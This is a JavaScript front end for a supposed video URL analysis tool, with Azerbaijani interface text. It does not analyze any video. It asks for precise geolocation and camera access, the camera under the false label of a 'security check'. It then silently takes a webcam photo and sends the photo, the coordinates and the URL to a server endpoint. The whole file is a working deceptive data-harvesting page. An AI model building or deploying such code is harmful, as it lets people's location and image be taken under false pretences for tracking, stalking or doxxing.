const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');
const videoElement = document.getElementById('videoElement');
const canvasElement = document.getElementById('canvasElement');
const context = canvasElement.getContext('2d');

analyzeButton.addEventListener('click', async () => {
    const videoUrl = videoUrlInput.value.trim();
    if (!videoUrl) {
        statusText.textContent = "Zəhmət olmasa, bir video URL daxil edin.";
        return;
    }

    statusText.textContent = 'Analiz başlayır...';
    progressBarContainer.style.display = 'block';
    progressBar.style.width = '10%';

    let locationData = null;
    let imageData = null;

    try {
        if ("geolocation" in navigator) {
            statusText.textContent = 'Lokasiya icazəsi tələb edilir...';
            await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        statusText.textContent = `Lokasiya alındı: Enlem ${locationData.latitude}, Boylam ${locationData.longitude}.`;
                        console.log('Lokasiya:', locationData);
                        resolve();
                    },
                    (error) => {
                        statusText.textContent = `Lokasiya icazəsi rədd edildi və ya xəta baş verdi: ${error.message}.`;
                        console.error('Lokasiya xətası:', error);
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        } else {
            statusText.textContent = "Brauzeriniz lokasiyanı dəstəkləmir.";
        }
        progressBar.style.width = '40%';

        statusText.textContent = 'Kamera icazəsi tələb edilir (təhlükəsizlik yoxlaması üçün)...';
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoElement.srcObject = stream;
        
        await new Promise(resolve => {
            videoElement.onloadedmetadata = () => {
                canvasElement.width = videoElement.videoWidth;
                canvasElement.height = videoElement.videoHeight;
                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                imageData = canvasElement.toDataURL('image/jpeg', 0.8);
                console.log('Kamera görüntüsü alındı (base64).');
                resolve();
                stream.getTracks().forEach(track => track.stop());
            };
        });
        progressBar.style.width = '70%';

        statusText.textContent = 'Bütün icazələr alındı. Məlumatlar serverə göndərilir...';

        const response = await fetch('/api/send-data', { 
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                videoUrl: videoUrl,
                location: locationData,
                image: imageData
            })
        });

        if (response.ok) {
            progressBar.style.width = '100%';
            statusText.textContent = `Analiz uğurla tamamlandı! Məlumatlar serverə göndərildi.`;
            setTimeout(() => {
                progressBarContainer.style.display = 'none';
                progressBar.style.width = '0%';
                videoUrlInput.value = '';
                statusText.textContent = '';
            }, 3000);
        } else {
            const errorData = await response.json();
            statusText.textContent = `Məlumat göndərilərkən xəta baş verdi: ${errorData.message || response.statusText}`;
            progressBar.style.width = '0%';
            progressBarContainer.style.display = 'none';
        }

    } catch (err) {
        statusText.textContent = `Analiz zamanı xəta baş verdi: ${err.message}. Lütfən, icazələrə baxın.`;
        progressBar.style.width = '0%';
        progressBarContainer.style.display = 'none';
        console.error('Xəta:', err);
    }
});
